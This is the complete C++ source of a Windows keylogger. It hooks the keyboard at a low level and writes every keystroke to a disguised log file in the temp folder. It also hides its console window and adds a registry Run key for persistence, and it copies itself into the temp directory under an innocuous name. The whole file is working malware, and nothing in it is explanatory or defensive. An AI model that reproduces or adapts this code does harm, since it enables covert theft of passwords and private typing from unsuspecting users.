#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <tchar.h>
#include <cstdlib>
#include <stdio.h>


 
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
 
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
char* env_p = std::getenv("TMP");
char file_name[20] = "\\system32log.log";
char full_path[100] = "";
strcat(full_path, env_p);
strcat(full_path, file_name);

    
	std::ofstream key_store (full_path, std::ios_base::app);
	if (nCode >= 0)
	{
		
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			switch(kbdStruct.vkCode)
			{
				case '0':
					key_store <<"0";
					break;
				case '1':
					key_store <<"1";
					break;
				case '2':
					key_store <<"2";
					break;
				case '3':
					key_store <<"3";
					break;
				case '4':
					key_store <<"4";
					break;
				case '5':
					key_store <<"5";
					break;
				case '6':
					key_store <<"6";
					break;
				case '7':
					key_store <<"7";
					break;
				case '8':
					key_store <<"8";
					break;
				case '9':
					key_store <<"9";
					break;
				case 'A':
					key_store <<"A";
					break;
				case 'B':
					key_store <<"B";
					break;
				case 'C':
					key_store <<"C";
					break;
				case 'D':
					key_store <<"D";
					break;
				case 'E':
					key_store <<"E";
					break;
				case 'F':
					key_store <<"F";
					break;
				case 'G':
					key_store <<"G";
					break;
				case 'H':
					key_store <<"H";
					break;
				case 'I':
					key_store <<"I";
					break;
				case 'J':
					key_store <<"J";
					break;
				case 'K':
					key_store <<"K";
					break;
				case 'L':
					key_store <<"L";
					break;
				case 'M':
					key_store <<"M";
					break;
				case 'N':
					key_store <<"N";
					break;
				case 'O':
					key_store <<"O";
					break;
				case 'P':
					key_store <<"P";
					break;
				case 'Q':
					key_store <<"Q";
					break;
				case 'R':
					key_store <<"R";
					break;
				case 'S':
					key_store <<"S";
					break;
				case 'T':
					key_store <<"T";
					break;
				case 'U':
					key_store <<"U";
					break;
				case 'V':
					key_store <<"V";
					break;
				case 'W':
					key_store <<"W";
					break;
				case 'X':
					key_store <<"X";
					break;
				case 'Y':
					key_store <<"Y";
					break;
				case 'Z':
					key_store <<"Z";
					break;
				case VK_BACK:
					key_store <<"-BackSpace-";
					break;
				case VK_SHIFT:
					key_store << "-Shift-";
					break;
				case VK_CONTROL:
					key_store << "-CTRL-";
					break;
				case VK_MENU:
					key_store << "-Alt-";
					break;
				case VK_CAPITAL:
					key_store << "-CapsLock-";
					break;
				case VK_DELETE:
					key_store << "-Del-";
					break;
				case VK_SPACE:
					key_store << "-Space-";
					break;
				case VK_RETURN:
					key_store << "-Enter-";
					break;
				case VK_OEM_MINUS:
					key_store << "---";
					break;
				case VK_OEM_2:
					key_store << "-/?-";
					break;
				case VK_OEM_1:
					key_store << "-;:-";
					break;
				case VK_OEM_PLUS:
					key_store << "-+-";
					break;
				case VK_OEM_COMMA:
					key_store << "-,-";
					break;
				case VK_OEM_PERIOD:
					key_store << "-.-";
					break;
				case VK_OEM_4:
					key_store << "-[{-";
					break;
				case VK_OEM_5:
					key_store << "-\\|-";
					break;
				case VK_OEM_6:
					key_store << "-]}-";
					break;
				case VK_OEM_7:
					key_store << "-single/double quote-";
					break;
			}
			key_store.close();
		}
	}
 
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
 
void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook. If you create a hack you will not need the callback function 
	// in another place then your own code file anyway. Read more about it at MSDN.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
 
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

static void write_in_file(std::string key){
	char* env_p = std::getenv("TMP");
	char file_name[20] = "\\system32log.log";
	char full_path[100] = "";
	strcat(full_path, env_p);
	strcat(full_path, file_name);

	std::ofstream key_store (full_path, std::ios_base::app);
	key_store << key;
	key_store.close();
}
 
int main()
{
	ShowWindow( GetConsoleWindow(), SW_HIDE);
	std::string reg_cmd = "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sys32startup /t REG_SZ /d ";
	std::string move_cmd = "move majukas.exe ";
	std::string exe_name = "\\majukas.exe";
	
	char* env_p = std::getenv("TMP");
	std::string env_var(env_p);
	
	std::string full_exe_path;
	full_exe_path.append(env_var);
	full_exe_path.append(exe_name);
	
	std::string full_move_cmd;
	full_move_cmd.append(move_cmd);
	full_move_cmd.append(env_var);
	
	std::string full_reg_cmd;
	full_reg_cmd.append(reg_cmd);
	full_reg_cmd.append(full_exe_path);
	
	
	
	write_in_file("\n====DAY===\n");
	int check_registery = system("REG QUERY HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sys32startup");
	if (check_registery == 1)
	{
		
		char for_full_reg_cmd[full_reg_cmd.size()+1];
		strcpy(for_full_reg_cmd, full_reg_cmd.c_str());
		system(for_full_reg_cmd);
		
		char for_full_move_cmd[full_move_cmd.size()+1];
		strcpy(for_full_move_cmd, full_move_cmd.c_str());
		system(for_full_move_cmd);
		
		system("del /F /Q majukas.exe");
	}
	
	SetHook();
 
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
 
	}
	
	return 0;
}



